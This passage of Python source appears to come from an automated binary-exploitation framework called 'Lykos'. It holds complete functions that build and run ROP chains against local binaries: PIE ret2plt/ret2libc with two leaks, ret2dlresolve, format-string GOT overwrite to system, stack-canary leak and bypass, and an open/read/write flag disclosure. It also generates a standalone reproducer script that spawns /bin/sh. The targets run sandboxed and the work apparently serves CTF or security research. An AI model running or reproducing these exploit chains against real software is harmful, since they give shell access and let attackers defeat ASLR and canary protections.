                        s2 = bytes(bytearray(b"A" * offset) + pad
                                   + struct.pack("<Q", libc_base + fog))
                    try:
                        p.stdin.write(s2); p.stdin.flush()
                        time.sleep(0.3)
                        p.stdin.write(markers.command + b"\n"); p.stdin.flush()
                    except (BrokenPipeError, OSError):
                        continue
                    out = _read_until(p, time.time() + timeout, quiet=1.5)
                    if markers.proves(out):
                        r = {"ok": True, "pie_base": base, "libc_base": libc_base, "technique": tech,
                             "align": align_off, "output": out[:400].decode("latin-1", "ignore")}
                        if tech == "ret2libc":
                            r["system"], r["binsh"] = libc_base + system_off, libc_base + binsh_off
                        else:
                            r["one_gadget"] = libc_base + fog
                        return r
                finally:
                    for stream in (p.stdin, p.stdout):
                        try:
                            if stream is not None:
                                stream.close()
                        except Exception:                # noqa: BLE001
                            pass
                    _kill(p)
                    try:
                        p.wait(timeout=2)
                    except Exception:                    # noqa: BLE001
                        pass
    return last


def render_pie_ret2plt_script(*, offset, leak_trigger, anchors, pop_rdi_off, puts_plt_off,
                              puts_got_off, ret_to_off, leaker, puts_libc_off, system_off,
                              binsh_off, one_gadget_off=None, align_off=None, pop_rsi_off=None,
                              pop_rdx_off=None, write_plt_off=None) -> bytes:
    """Self-contained stdlib reproducer for the PIE ret2plt -> ret2libc chain (`_pie_ret2plt_exploit`):
    two leaks in ONE process, re-derived live on every run so a freshly randomized base/libc is
    defeated honestly.

      phase 0: feed `leak_trigger` into the staging over-read; harvest the spilled pointer words and
               corroborate the PIE base against the baked image `anchors` (>=2 distinct slots, exactly
               as `recover_pie_base` does) -- no analysis engine, no ASLR-off oracle.
      stage 1: a base-relocated `puts(puts@GOT)` / `write(1,GOT,8)` chain prints the libc address of
               the leaked symbol and returns to `ret_to` (main), so the loop reads again.
      stage 2: resolve the libc base (leaked - `puts_libc_off`), re-feed the staging read, then
               ret2libc `system("/bin/sh")` (or the confirmed one-gadget), with the live run's
               stack-alignment pad. A real shell EVALUATES a random arithmetic challenge ([+]/exit 0);
               a target that merely echoes stdin prints the literal `$((..))` and fails the grade.

    All image `*_off` are relocated by the recovered PIE base; the libc `*_off` by the resolved libc
    base; `align_off` is a base-relocated `ret` for rsp alignment (the live run's choice), or None."""
    w = (leaker == "write")
    s1 = ("p(base+POP_RDI)+p(1)+p(base+POP_RSI)+p(base+PUTS_GOT)+p(base+POP_RDX)+p(8)"
          "+p(base+WRITE_PLT)+p(base+RET_TO)") if w else \
         "p(base+POP_RDI)+p(base+PUTS_GOT)+p(base+PUTS_PLT)+p(base+RET_TO)"
    tail = ("p(libc+ONE_GADGET)" if one_gadget_off is not None
            else "p(base+POP_RDI)+p(libc+BINSH)+p(libc+SYSTEM)")
    return (
        "#!/usr/bin/env python3\n"
        "# Lykos L3 reproducer: PIE/ASLR ret2plt -> ret2libc, two leaks in one process. Authorized "
        "use only.\n"
        "# RUN IN A SANDBOX/VM -- this executes an untrusted binary and spawns a shell from it.\n"
        "import os, random, select, struct, subprocess, sys, time\n"
        "p = lambda v: struct.pack('<Q', v & (2**64-1))\n"
        f"OFF={offset}; TRIG={leak_trigger!r}; LEAKER={leaker!r}\n"
        f"POP_RDI={hex(pop_rdi_off)}; PUTS_PLT={hex(puts_plt_off)}; PUTS_GOT={hex(puts_got_off)}; "
        f"RET_TO={hex(ret_to_off)}; PUTS_LIBC={hex(puts_libc_off)}\n"
        f"POP_RSI={hex(pop_rsi_off) if pop_rsi_off is not None else None}; "
        f"POP_RDX={hex(pop_rdx_off) if pop_rdx_off is not None else None}; "
        f"WRITE_PLT={hex(write_plt_off) if write_plt_off is not None else None}\n"
        f"SYSTEM={hex(system_off)}; BINSH={hex(binsh_off)}; "
        f"ONE_GADGET={hex(one_gadget_off) if one_gadget_off is not None else None}; "
        f"ALIGN={hex(align_off) if align_off is not None else None}\n"
        f"ANCHORS={anchors!r}\n"
        "def read_until(io, deadline, quiet=0.3):\n"
        "    out, last = b'', time.time()\n"
        "    while time.time() < deadline:\n"
        "        r, _, _ = select.select([io.stdout], [], [], 0.1)\n"
        "        if r:\n"
        "            c = os.read(io.stdout.fileno(), 4096)\n"
        "            if not c: break\n"
        "            out, last = out + c, time.time()\n"
        "        elif io.poll() is not None: break\n"
        "        elif out and time.time() - last > quiet: break\n"
        "    return out\n"
        "def ptr_words(buf):\n"                               # the over-read spills raw LE pointers
        "    o = []\n"
        "    for i in range(0, max(0, len(buf) - 7)):\n"
        "        v = int.from_bytes(buf[i:i+8], 'little')\n"
        "        if v < (1 << 48) and 0x10 <= (v >> 40) <= 0x7f: o.append(v)\n"
        "    return o\n"
        "io = subprocess.Popen([sys.argv[1]], stdin=subprocess.PIPE, stdout=subprocess.PIPE,\n"
        "                      stderr=subprocess.STDOUT)\n"
        "time.sleep(0.2); read_until(io, time.time() + 0.5)\n"
        "io.stdin.write(TRIG); io.stdin.flush()\n"            # phase 0: over-read -> PIE base
        "buf = read_until(io, time.time() + 3)\n"
        "sup = {}\n"
        "for v in set(ptr_words(buf)):\n"
        "    for va in ANCHORS.get(v & 0xfff, []):\n"
        "        b = v - va\n"
        "        if b > 0 and b % 0x1000 == 0: sup.setdefault(b, set()).add(v)\n"
        "base = max(sup, key=lambda b: len(sup[b]), default=None)\n"
        "if base is None or len(sup[base]) < 2:\n"
        "    print('[-] PIE base not recovered from the over-read leak'); io.kill(); sys.exit(1)\n"
        "print('pie base', hex(base))\n"
        f"io.stdin.write(b'A'*OFF + {s1}); io.stdin.flush()\n"   # stage 1: leak a libc pointer
        "burst = read_until(io, time.time() + 3)\n"
        "raw = burst[:8] if LEAKER == 'write' else burst.split(b'\\n', 1)[0][:6]\n"
        "if len(raw) < 6:\n"
        "    print('[-] libc pointer not leaked'); io.kill(); sys.exit(1)\n"
        "libc = int.from_bytes(raw.ljust(8, b'\\x00'), 'little') - PUTS_LIBC\n"
        "if libc <= 0 or libc % 0x1000 != 0:\n"
        "    print('[-] libc base not resolved'); io.kill(); sys.exit(1)\n"
        "print('libc base', hex(libc))\n"
        "io.stdin.write(TRIG); io.stdin.flush(); read_until(io, time.time() + 0.4)\n"  # re-feed staging
        "align = p(base + ALIGN) if ALIGN is not None else b''\n"
        f"io.stdin.write(b'A'*OFF + align + {tail}); io.stdin.flush(); time.sleep(0.3)\n"  # stage 2
        "a, b = random.randint(1000, 9999), random.randint(1000, 9999)\n"
        "io.stdin.write(b'echo LYKOS_SHELL_$((%d*%d))\\n' % (a, b))\n"
        "try: io.stdin.flush(); io.stdin.close()\n"
        "except OSError: pass\n"
        "try: out, _ = io.communicate(timeout=6)\n"
        "except subprocess.TimeoutExpired: io.kill(); out, _ = io.communicate()\n"
        "sys.stdout.write(out.decode('latin-1', 'ignore'))\n"
        "if (b'LYKOS_SHELL_%d' % (a*b)) in out:\n"
        "    print('\\n[+] two-leak ASLR defeat reproduced -- a shell evaluated the challenge'); "
        "sys.exit(0)\n"
        "print('\\n[-] no shell answered the challenge'); sys.exit(1)\n"
    ).encode()


def ret2dlresolve(exe, workdir, *, offset, read_plt, plt0, pop_rdi, pop_rsi, pop_rdx, ret_gadget,
                  jmprel, symtab, strtab, scratch, symbol=b"system", arg=b"/bin/sh",
                  base_argv=(), timeout: float = 8.0, mem_mb: int = 2048) -> dict:
    """Leak-free ret2dlresolve, confirmed by a spawned shell. Forge an Elf64_Rela + Elf64_Sym +
    the "system" string in the target's own .bss, read them in with one read(0, scratch, n), then
    drop into PLT0 with the forged reloc index so the loader resolves `symbol` and calls it with
    rdi = &arg. No libc leak, no `system` PLT entry -- it works against whatever loader the target
    runs under (older offline glibc included), because everything forged is the target's own data.

    system()/do_system needs a 16-byte-aligned rsp and the re-entered frame's parity is
    environment-dependent, so BOTH parities are detonated on a fresh process each. Success = the
    spawned shell EVALUATES the forgery-proof marker. Returns {ok, align, ...}.
    """
    from . import attribution, rop
    markers = attribution.make_code_markers()
    exedir = str(Path(exe).resolve().parent)
    argv = [str(a) for a in base_argv]
    for align in (False, True):
        chain, fake = rop.build_ret2dlresolve(
            offset, read_plt=read_plt, plt0=plt0, pop_rdi=pop_rdi, pop_rsi=pop_rsi, pop_rdx=pop_rdx,
            ret_gadget=ret_gadget, jmprel=jmprel, symtab=symtab, strtab=strtab, scratch=scratch,
            symbol=symbol, arg=arg, align=align)
        preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
        cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + [str(exe)] + argv
        try:
            p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                 stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
                                 preexec_fn=preexec)
        except Exception as e:                           # noqa: BLE001
            return {"ok": False, "reason": f"spawn failed: {e!r}"}
        try:
            _read_until(p, time.time() + 0.5)            # drain the target's banner
            try:
                p.stdin.write(chain); p.stdin.flush()    # stage 1: overflow -> read(scratch) chain
                time.sleep(0.2)
                p.stdin.write(fake); p.stdin.flush()     # the forged structures the read consumes
                time.sleep(0.3)
            except (BrokenPipeError, OSError):
                continue                                 # crashed before the resolve -> try parity
            if p.poll() is None:
                try:
                    p.stdin.write(markers.command + b"\n")
                    p.stdin.flush()
                except (BrokenPipeError, OSError):
                    pass
            out = _read_until(p, time.time() + timeout, quiet=1.5)
            if markers.proves(out):                      # a shell EVALUATED the challenge
                return {"ok": True, "align": align, "scratch": scratch, "reloc_symbol": symbol,
                        "output": out[:400].decode("latin-1", "ignore")}
        finally:
            for stream in (p.stdin, p.stdout):
                try:
                    if stream is not None:
                        stream.close()
                except Exception:                        # noqa: BLE001
                    pass
            _kill(p)
            try:
                p.wait(timeout=2)
            except Exception:                            # noqa: BLE001
                pass
    return {"ok": False, "reason": "no shell confirmed (ret2dlresolve did not spawn a shell under "
                                   "either stack alignment; is the target binding lazily?)"}


# --- analyst-assisted PIE ret2libc (pure-libc ROP; no pie_base needed) --------------------------
def analyst_ret2libc(exe, workdir, *, offset, libc_data, leak_offset=None, leak_sym=None,
                     leak_trigger: bytes = b"", leak_regex: str = r"0x[0-9a-fA-F]+",
                     leak_index=None, base_argv=(), marker: bytes = b"LYKOS-PIE-R2L-9931",
                     timeout: float = 8.0, mem_mb: int = 2048) -> dict:
    """PIE/ASLR ret2libc where the ANALYST makes the leak deterministic.

    A PIE target's own gadgets are unusable until pie_base is known, and recovering pie_base (or
    libc_base) generically from a `%p` dump is target/libc-specific (which slot, which symbol, a
    version-specific return offset). Instead the analyst supplies what they identified: a
    `leak_trigger` that discloses a LIBC pointer and either the symbol it points to (`leak_sym`)
    or its raw libc offset (`leak_offset`), so `libc_base = leaked - leak_offset`. The chain is then
    a PURE-LIBC ROP -- `pop rdi; ret` and the `ret` pad come from libc too -- so it never needs
    pie_base. `leak_regex` extracts hex pointers; `leak_index` picks which match (default: the first
    whose subtraction yields a page-aligned base). Success is a spawned shell echoing `marker`.
    """
    import re as _re
    import struct as _struct

    from . import attribution, rop
    markers = attribution.make_code_markers()            # forgery-proof: an echo can't fake a shell
    auto = leak_offset is None and not leak_sym          # no slot named -> auto-classify the dump
    if leak_offset is None and leak_sym:
        leak_offset = rop.libc_symbols(libc_data, (leak_sym,)).get(leak_sym)
        if leak_offset is None:
            return {"ok": False, "reason": f"leak_sym {leak_sym!r} not in libc .dynsym"}
    pop_rdi = rop.find_gadget(libc_data, "pop_rdi")
    ret_g = rop.find_gadget(libc_data, "ret")
    binsh = rop.find_string(libc_data, b"/bin/sh")
    system = rop.libc_symbols(libc_data, ("system",)).get("system")
    q = lambda v: _struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)      # noqa: E731
    # The redirect tail, tried in order. Preferred: pop-rdi; "/bin/sh"; system. Fallback: a libc
    # one-gadget (a single address that execve's "/bin/sh" when rsi/rdx are NULL) -- covers targets
    # whose libc lacks a clean pop-rdi/system pairing, and older glibc where one-gadgets are common.
    # An unusable gadget (its register constraint does not hold at the hijack) simply fails to spawn
    # a shell and the next tail is tried; the live-shell check never mints a false positive.
    tails = []
    if pop_rdi and binsh and system:
        tails.append(("system", lambda base, pad: ((q(base + ret_g) if ret_g else b"") if pad else b"")
                                                  + q(base + pop_rdi) + q(base + binsh) + q(base + system)))
    for g in rop.find_one_gadgets(libc_data)[:4]:
        og = g["offset"]
        tails.append((f"one_gadget@{hex(og)} [{g['constraint']}]",
                      lambda base, pad, o=og: ((q(base + ret_g) if ret_g else b"") if pad else b"")
                                              + q(base + o)))
    if not tails:
        return {"ok": False, "reason": "libc lacks a pop-rdi gadget / \"/bin/sh\" / system and has "
                                       "no usable one-gadget"}
    rx = _re.compile(leak_regex.encode("latin-1"))
    exedir = str(Path(exe).resolve().parent)
    argv = [str(a) for a in base_argv]
    last = None
    for tail_name, tail_fn in tails:
      for pad in (0, 1):                                          # stage alignment: even, then odd
        for _ in range(2):
            preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
            cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + [str(exe)] + argv
            try:
                p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, cwd=exedir,
                                     start_new_session=True, preexec_fn=preexec)
            except Exception as e:                               # noqa: BLE001
                return {"ok": False, "reason": f"spawn failed: {e!r}"}
            try:
                if leak_trigger:
                    try:
                        p.stdin.write(leak_trigger)
                        p.stdin.flush()
                    except (BrokenPipeError, OSError):
                        continue
                burst = _read_until(p, time.time() + timeout / 2)
                vals = []
                for m in rx.finditer(burst):
                    try:
                        vals.append(int(m.group(0), 16))
                    except ValueError:
                        pass
                cands = [vals[leak_index]] if (leak_index is not None and
                                               -len(vals) <= leak_index < len(vals)) else vals
                base = None
                if auto:                                     # no slot named: recover from >=2 syms
                    base = rop.recover_libc_base(cands, libc_data)
                    if base:
                        last = base
                else:
                    for v in cands:
                        b = v - leak_offset
                        if b > 0 and b % 0x1000 == 0:            # a real libc base is page-aligned
                            base, last = b, b
                            break
                if base is None:
                    continue
                chain = bytearray(b"A" * offset) + tail_fn(base, pad)
                try:
                    p.stdin.write(bytes(chain))
                    p.stdin.flush()
                    time.sleep(0.3)
                    p.stdin.write(markers.command + b"\n")
                    p.stdin.flush()
                except (BrokenPipeError, OSError):
                    break                                        # wrong parity: crashed
                out = _read_until(p, time.time() + timeout, quiet=1.5)
                if markers.proves(out):
                    r = {"ok": True, "base": base, "pad": pad, "tail": tail_name,
                         "output": out[:400].decode("latin-1", "ignore")}
                    if system:
                        r["system"], r["binsh"] = base + system, base + binsh
                    return r
            finally:
                for s in (p.stdin, p.stdout):
                    try:
                        if s is not None:
                            s.close()
                    except Exception:                            # noqa: BLE001
                        pass
                _kill(p)
                try:
                    p.wait(timeout=2)
                except Exception:                                # noqa: BLE001
                    pass
    return {"ok": False, "reason": "no shell confirmed (leak parsed but the pure-libc chain did not "
                                   "spawn a shell under either alignment)", "base": last}


# --- ret2libc past a STACK CANARY (leak it, write it back, then chain) ---------------------------
def orw_leak(exe, workdir, *, offset, pop_rdi, pop_rsi, pop_rdx, puts_plt, puts_got, ret_to,
             puts_off, open_off, read_off, write_off, scratch=None, scratch_off=None,
             flag_path=b"flag", flag_marker=b"", ret_gadget=None, leaker="puts", write_plt=None,
             base_argv=(), timeout: float = 8.0, mem_mb: int = 2048, frame=None) -> dict:
    """Two-stage leak + open/read/write: stage 1 leaks libc (puts/write of a GOT slot) and returns to
    the loop; stage 2 runs an ORW ROP that reads `flag_path` and writes it to stdout. Used when a
    seccomp filter blocks execve so system("/bin/sh") can never confirm. Confirmation is the
    DISCLOSURE itself -- `flag_marker` (planted only in the file, never sent as input) appearing in
    the output proves the chain opened+read the file. `frame` wraps each OVERFLOW stage in the
    structure L2 measured (the path is read raw by the chain). Returns {ok, base, align, stage1,
    disclosed}."""
    _f = frame or (lambda b: b)

    from . import rop
    exedir = str(Path(exe).resolve().parent)
    argv = [str(a) for a in base_argv]
    path_blob = (flag_path if isinstance(flag_path, (bytes, bytearray)) else flag_path.encode()) + b"\x00"

    for align in ([None, ret_gadget] if ret_gadget is not None else [None]):
        for _ in range(3):
            preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
            cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + [str(exe)] + argv
            try:
                p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
                                     preexec_fn=preexec)
            except Exception as e:                               # noqa: BLE001
                return {"ok": False, "reason": f"spawn failed: {e!r}"}
            try:
                _read_until(p, time.time() + 0.5)
                if leaker == "write" and pop_rsi and pop_rdx and write_plt:
                    s1 = rop.build_leak_write(offset, pop_rdi=pop_rdi, pop_rsi=pop_rsi,
                                              pop_rdx=pop_rdx, got=puts_got, write_plt=write_plt,
                                              ret_to=ret_to)
                else:
                    s1 = rop.build_leak_puts(offset, pop_rdi=pop_rdi, got=puts_got,
                                             puts_plt=puts_plt, ret_to=ret_to)
                s1 = _f(s1)
                try:
                    p.stdin.write(s1); p.stdin.flush()
                except (BrokenPipeError, OSError):
                    continue
                burst = _read_until(p, time.time() + timeout / 2)
                raw = (burst[:8] if leaker == "write" else burst.split(b"\n", 1)[0][:6])
                if len(raw) < 6:
                    continue
                base = rop.resolve_libc_base(int.from_bytes(raw.ljust(8, b"\x00"), "little"), puts_off)
                if not base:
                    continue
                # stage 2: the ORW chain. libc fns relocated by the leaked base. The scratch holding
                # the path + the file content is taken in LIBC's own writable .bss (base+scratch_off)
                # -- it is large and PIE-safe, unlike a tiny / RELRO-protected binary .bss. A fixed
                # binary `scratch` is the fallback for an unusual no-PIE layout.
                eff_scratch = (base + scratch_off) if scratch_off is not None else scratch
                if eff_scratch is None:
                    continue
                s2 = rop.build_orw_rop(offset, pop_rdi=pop_rdi, pop_rsi=pop_rsi, pop_rdx=pop_rdx,
                                       open_fn=base + open_off, read_fn=base + read_off,
                                       write_fn=base + write_off, scratch=eff_scratch,
                                       path_len=len(path_blob) + 8, ret_gadget=align)
                s2 = _f(s2)
                try:
                    p.stdin.write(s2); p.stdin.flush()
                    time.sleep(0.2)
                    p.stdin.write(path_blob)              # consumed by the ORW's read(0, scratch, ..)
                    p.stdin.flush()
                except (BrokenPipeError, OSError):
                    break
                out = _read_until(p, time.time() + timeout, quiet=1.2)
                if flag_marker and flag_marker in out:
                    return {"ok": True, "base": base, "align": align, "stage1": s1,
                            "disclosed": out[:400].decode("latin-1", "ignore")}
            finally:
                for s in (p.stdin, p.stdout):
                    try:
                        if s is not None:
                            s.close()
                    except Exception:                            # noqa: BLE001
                        pass
                _kill(p)
                try:
                    p.wait(timeout=2)
                except Exception:                                # noqa: BLE001
                    pass
    return {"ok": False, "reason": "ORW chain did not disclose the flag", "base": None}


def newline_write_targets(got_slot: int, nbytes: int = 6, word: int = 8) -> list:
    """Write-target addresses (got_slot .. got_slot+nbytes-1) that carry a 0x0a (newline) byte.

    A `%hhn` GOT overwrite plants `nbytes` of a libc address, one byte per consecutive target
    address; each target is packed into the payload as a pointer. If any target has a 0x0a byte, a
    line-delimited sink (fgets/scanf) truncates the payload at it and the write cannot be delivered
    byte-for-byte -- a fundamental bad-byte constraint, not a payload-construction bug. Returned as
    hex strings for a human-facing reason. Base-independent: the printf count fields are ASCII."""
    return [hex(got_slot + i) for i in range(nbytes)
            if 0x0A in struct.pack("<Q" if word == 8 else "<I", got_slot + i)]


def format_got_shell(exe, workdir, *, got_slot, system_off, leak_got=None, leak_off=None,
                     base_argv=(), timeout: float = 8.0, mem_mb: int = 2048,
                     marker: bytes = b"LYKOS-FMT-9931") -> dict:
    """Auto format-string -> shell for a LOOPING printf(user) sink (no-PIE, writable GOT). In one
    process: (1) recover the format argument offset, (2) leak the libc address in `got_slot` with a
    DETERMINISTIC `%N$s` read (base = leaked - `sym_off`; no %p-dump classification, which a stack
    rarely satisfies), (3) %hhn-overwrite `got_slot` (the sink's own printf@GOT) with system, (4)
    send "/bin/sh" so the loop's next printf(buf) becomes system("/bin/sh"). Confirmed by a spawned
    shell EVALUATING the marker (not an echo). No analyst config and no win function -- the write
    target and value are both auto-derived. Only a LOOPING sink reaches it: a single-shot sink cannot
    both leak and write."""
    from . import attribution, fmt
    markers = attribution.make_code_markers()
    exedir = str(Path(exe).resolve().parent)
    argv = [str(a) for a in base_argv]
    # Leak a DIFFERENT GOT slot than the one we overwrite: a %s reads until a NUL, so the leaked
    # function's address must not start with 0x00 -- and a page-aligned-offset function (printf,
    # whose offset ends in 000) does exactly that. The caller picks a leak fn with a non-zero low
    # byte; default to the overwrite target only as a fallback.
    lg = leak_got if leak_got is not None else got_slot
    lo = leak_off if leak_off is not None else system_off

    # A newline byte ANYWHERE in the write payload truncates delivery to a line-reading sink
    # (fgets/scanf stop at \n), after which the trailing %hhn directives index uninitialised stack
    # and the child SIGSEGVs mid-write. The byte almost always comes from a write-TARGET address:
    # overwriting printf@GOT writes bytes to got_slot+0..+5 (a 6-byte libc address), and one of
    # those addresses can carry a 0x0a (e.g. got_slot 0x404008 -> 0x40400a). It is base-independent
    # (the counts are ASCII, never 0x0a), so flag it up front -- so the failure is EXPLAINED, not a
    # mystery crash. (A read()-based sink is unaffected -- read() does not stop at a newline.)
    newline_targets = newline_write_targets(got_slot)

    for _ in range(3):
        preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
        cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + [str(exe)] + argv
        try:
            p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                 stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
                                 preexec_fn=preexec)
        except Exception as e:                               # noqa: BLE001
            return {"ok": False, "reason": f"spawn failed: {e!r}"}
        try:
            _read_until(p, time.time() + 0.5)
            # 1) argument offset where the format buffer lands
            try:
                p.stdin.write(fmt.probe_payload(count=30)); p.stdin.flush()
            except (BrokenPipeError, OSError):
                continue
            arg_off = fmt.find_fmt_offset(_read_until(p, time.time() + timeout / 3))
            if not arg_off:
                continue
            # 2) leak the libc address in the leak GOT slot via a deterministic positional %s
            try:
                p.stdin.write(fmt.read_at_payload(arg_off, lg)); p.stdin.flush()
            except (BrokenPipeError, OSError):
                continue
            dump = _read_until(p, time.time() + timeout / 3)
            raw = dump[:6]                                # %s prints the deref'd string FIRST
            if len(raw) < 6:
                continue
            base = int.from_bytes(raw.ljust(8, b"\x00"), "little") - lo
            if base <= 0 or (base & 0xFFF):              # not page-aligned -> wrong leak, retry
                continue
            # 3) overwrite the sink's printf@GOT with system. The payload must be delivered as a
            # COMPLETE LINE: the common format-string sink reads with fgets/scanf and does not act
            # until it sees a newline, so an unterminated write just blocks there and no overwrite
            # happens (the "format GOT->system did not spawn a shell" dead end). The trailing NUL
            # bytes of the packed address table stop printf's own parse before the newline, so the
            # terminator is harmless to the write itself and also fine for a read()-based sink.
            write_payload = fmt.fmtstr_payload(arg_off, {got_slot: base + system_off})
            if not write_payload:                        # fixed point did not converge: give up this try
                continue
            try:
                p.stdin.write(write_payload + b"\n"); p.stdin.flush()
            except (BrokenPipeError, OSError):
                continue
            _read_until(p, time.time() + timeout / 3)
            # 4) next printf(buf) == system(buf): hand it "/bin/sh" as its own line (newline so a
            # line-reading sink consumes it; the NUL ends the string so system sees exactly
            # "/bin/sh"), then drive the shell with the forgery-proof marker command.
            try:
                p.stdin.write(b"/bin/sh\x00\n"); p.stdin.flush()
                time.sleep(0.3)
                p.stdin.write(markers.command + b"\n"); p.stdin.flush()
            except (BrokenPipeError, OSError):
                continue
            out = _read_until(p, time.time() + timeout, quiet=1.5)
            if markers.proves(out):
                return {"ok": True, "base": base, "system": base + system_off, "arg_offset": arg_off,
                        "output": out[:400].decode("latin-1", "ignore")}
        finally:
            for s in (p.stdin, p.stdout):
                try:
                    if s is not None:
                        s.close()
                except Exception:                            # noqa: BLE001
                    pass
            _kill(p)
            try:
                p.wait(timeout=2)
            except Exception:                                # noqa: BLE001
                pass
    if newline_targets:
        return {"ok": False, "base": None,
                "reason": ("format GOT->system could not be delivered: a write-target address "
                           + ", ".join(newline_targets) + " contains a 0x0a (newline) byte, which a "
                           "line-delimited sink (fgets/scanf) truncates -- the overwrite cannot be "
                           "sent byte-for-byte. A read()-based sink would be unaffected; otherwise "
                           "this GOT slot is not reachable by this technique.")}
    return {"ok": False, "reason": "format GOT->system did not spawn a shell", "base": None}


def discover_canary_offset(exe, workdir, *, canary_trigger=b"", base_argv=(), timeout: float = 8.0,
                           mem_mb: int = 2048, lo: int = 8, hi: int = 400):
    """Auto-recover the overflow distance to the STACK CANARY by binary-searching the payload length
    at which the target FIRST trips __stack_chk_fail. A canary target aborts the normal L2 IP-control
    probe, so the control offset cannot be measured that way; but overwriting the canary's low byte at
    offset C needs exactly K=C+1 bytes, and any K>=C+1 aborts while K<C+1 does not -- a clean monotone
    threshold. `canary_trigger` is sent first to consume the leak read (the same two-step protocol
    canary_ret2libc uses). Returns (canary_offset, ret_offset) -- ret is 16 bytes past the canary in
    the standard x86-64 frame ([buf][canary][saved rbp][return]) -- or None when the shape does not
    hold (the high end never aborts, i.e. not a plain saved-canary stack overflow on this channel)."""
    exedir = str(Path(exe).resolve().parent)
    argv = [str(a) for a in base_argv]
    trig = (canary_trigger if isinstance(canary_trigger, (bytes, bytearray))
            else (canary_trigger.encode("latin-1") if canary_trigger else b""))

    def _aborts(k):
        preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
        cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + [str(exe)] + argv
        try:
            p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                 stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
                                 preexec_fn=preexec)
        except Exception:                                    # noqa: BLE001
            return None
        try:
            _read_until(p, time.time() + 0.4)                # banner
            if trig:
                try:
                    p.stdin.write(trig); p.stdin.flush()
                except (BrokenPipeError, OSError):
                    return None
                _read_until(p, time.time() + 0.4)            # drain the leak output
            try:
                p.stdin.write(b"A" * k); p.stdin.flush(); p.stdin.close()
            except (BrokenPipeError, OSError):
                pass
            out = _read_until(p, time.time() + timeout / 2)
            try:
                rc = p.wait(timeout=2)
            except Exception:                                # noqa: BLE001
                rc = None
            # glibc prints "*** stack smashing detected ***" and raises SIGABRT (6); bwrap reports
            # 128+6, a native run -6.
            return (b"stack smashing" in out) or (rc in (-6, 134))
        finally:
            _kill(p)
            try:
                p.wait(timeout=1)
            except Exception:                                # noqa: BLE001
                pass

    if not _aborts(hi):
        return None                                          # no canary abort even at the far end
    a, b = lo, hi
    if _aborts(a):                                           # even the low end aborts: search below it
        a = 1
    while a < b:                                             # smallest K that aborts
        mid = (a + b) // 2
        res = _aborts(mid)
        if res is None:
            return None
        if res:
            b = mid
        else:
            a = mid + 1
    canary_offset = max(0, a - 1)
    return canary_offset, canary_offset + 16


def canary_ret2libc(exe, workdir, *, offset, canary_offset, ret_offset, canary_trigger,
                    pop_rdi, puts_plt, puts_got, ret_to, puts_off, system_off, binsh_off,
                    ret_gadget=None, canary_index=None, canary_regex: str = r"0x[0-9a-fA-F]+",
                    loop_feed: bytes | None = None, base_argv=(), marker: bytes = b"LYKOS-CAN-9931",
                    timeout: float = 8.0, mem_mb: int = 2048) -> dict:
    """ret2libc on a stack-canary-protected no-PIE target. A canary is a per-process random word
    between the buffer and the saved return; overflowing past it trips __stack_chk_fail unless the
    canary is written back UNCHANGED, and its value is random so it has to be LEAKED at runtime.

    `canary_trigger` (a format string / an over-read request) discloses the canary in the SAME
    process; `rop.find_canary` picks it out (or `canary_index` names the leak slot). Every overflow
    then carries `build_canary_prefix` -- pad to the canary, the leaked canary, pad to the return --
    before the ROP. The rest is the two-stage puts leak: stage 1 leaks libc and returns to `ret_to`,
    stage 2 calls system("/bin/sh"). `loop_feed` is what the re-entered loop reads before the second
    overflow (default: the canary trigger again, harmless). Confirmed by a spawned shell.
    """
    import re as _re
    import struct as _struct

    from . import attribution, rop
    # Forgery-proof confirm: the marker command only resolves if a shell EVALUATES it (an echo of
    # the input, a menu that reflects it, or a banner can never satisfy `markers.proves`).
    markers = attribution.make_code_markers()
    rx = _re.compile(canary_regex.encode("latin-1"))
    q = lambda v: _struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)      # noqa: E731
    feed = canary_trigger if loop_feed is None else loop_feed
    exedir = str(Path(exe).resolve().parent)
    argv = [str(a) for a in base_argv]

    def _canary(p):
        try:
            p.stdin.write(canary_trigger)
            p.stdin.flush()
        except (BrokenPipeError, OSError):
            return None
        dump = _read_until(p, time.time() + timeout / 2)
        vals = [int(m.group(0), 16) for m in rx.finditer(dump)
                if _allint(m.group(0))]
        vals += _le_canary_words(dump)               # a raw over-read leaks the canary as binary
        if canary_index is not None and -len(vals) <= canary_index < len(vals):
            return vals[canary_index]
        return rop.find_canary(vals)

    for align in (None, ret_gadget):
        for _ in range(3):
            preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
            cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + [str(exe)] + argv
            try:
                p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, cwd=exedir,
                                     start_new_session=True, preexec_fn=preexec)
            except Exception as e:                               # noqa: BLE001
                return {"ok": False, "reason": f"spawn failed: {e!r}"}
            try:
                _read_until(p, time.time() + 0.5)
                canary = _canary(p)
                if canary is None:
                    continue
                pre = rop.build_canary_prefix(canary_offset, canary, ret_offset)
                # stage 1: leak libc via puts (canary preserved), return to the loop
